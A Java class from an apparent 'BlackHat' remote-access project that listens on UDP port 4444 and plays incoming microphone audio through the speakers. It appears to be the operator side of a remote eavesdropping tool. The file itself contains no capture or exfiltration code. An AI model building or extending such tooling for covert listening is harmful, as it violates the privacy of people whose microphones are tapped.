/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Audio;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.SourceDataLine;
import javax.sound.sampled.TargetDataLine;

/**
 *
 * @author abaza
 */
public class lifeAudioSpecker extends Thread {

    ByteArrayOutputStream byteOutputStream;
    AudioFormat adFormat;
    TargetDataLine targetDataLine;
    AudioInputStream InputStream;
    SourceDataLine Specker;
    int SIZE_BUFFR = 100000;
    Thread playThread = null;
    private boolean lSpicker = false;

    public void Status(boolean SwitchKey) {
        if (SwitchKey) {
            lSpicker = true;
            this.start();
        } else {
            this.interrupt();
        }
    }

    @Override
    public void run() {
        try {
            int PortAudio = 4444;//Integer.parseInt(blackhat.BlackHat.Args.get("AUDIO_PORT"));
            DatagramSocket serverSocket = new DatagramSocket(PortAudio);
            byte[] receiveData = new byte[SIZE_BUFFR];

            while (lSpicker) {
                if (!lSpicker) {
                    this.interrupt();
                }
                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                serverSocket.receive(receivePacket); // Reseverd Mic Input sound 
                if (blackhat.BlackHat.Debug) {
                    System.out.println("RECEIVED SOUND: ");
                }

                try {
                    byte audioData[] = receivePacket.getData();//byteOutputStream.toByteArray();
                    InputStream byteInputStream = new ByteArrayInputStream(audioData);
                    adFormat = getAudioFormat();
                    InputStream = new AudioInputStream(byteInputStream, adFormat, audioData.length / adFormat.getFrameSize());
                    DataLine.Info dataLineInfo = new DataLine.Info(SourceDataLine.class, adFormat);
                    Specker = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
                    Specker.open(adFormat); // Open Mixer to Output Sound
                    Specker.start();

                    if (playThread == null) {
                        playThread = new Thread(new PlayThread());
                    } else {
                        playThread.interrupt();
                        playThread = null;
                        playThread = new Thread(new PlayThread());
                    }
                    playThread.start();
                } catch (Exception e) {
                    System.gc();
                    if (blackhat.BlackHat.Debug) {
                        System.err.println("ERROR AUDIO LIFE : " + e.getMessage());
                    }
                    run();
                }
            }

        } catch (NumberFormatException | IOException e) {
        }
    }

    class PlayThread extends Thread {

        byte tempBuffer[] = new byte[SIZE_BUFFR];

        @Override
        public void run() {
            try {
                int cnt;
                while ((cnt = InputStream.read(tempBuffer, 0, tempBuffer.length)) != -1) {
                    if (cnt > 0) {
                        Specker.write(tempBuffer, 0, cnt); // Write Sound Data to Spicker
                    }
                }
            } catch (Exception e) {
                if (blackhat.BlackHat.Debug) {
                    System.err.println("ERROR AUDIO LIFE : " + e.getMessage());
                }
            }
        }

        @Override
        public void interrupt() {
            Specker.drain();
            Specker.close();
        }
    }

    private AudioFormat getAudioFormat() {
        float sampleRate = 16000.0F;
        int sampleInbits = 16;
        int channels = 1;
        boolean signed = true;
        boolean bigEndian = false;
        return new AudioFormat(sampleRate, sampleInbits, channels, signed, bigEndian);
    }

    @Override
    public synchronized void interrupt() {
        lSpicker = false;
        if (Specker != null) {
            Specker.close();
            Specker = null;
        }
        if (playThread != null) {
            playThread = null;
        }
    }
}
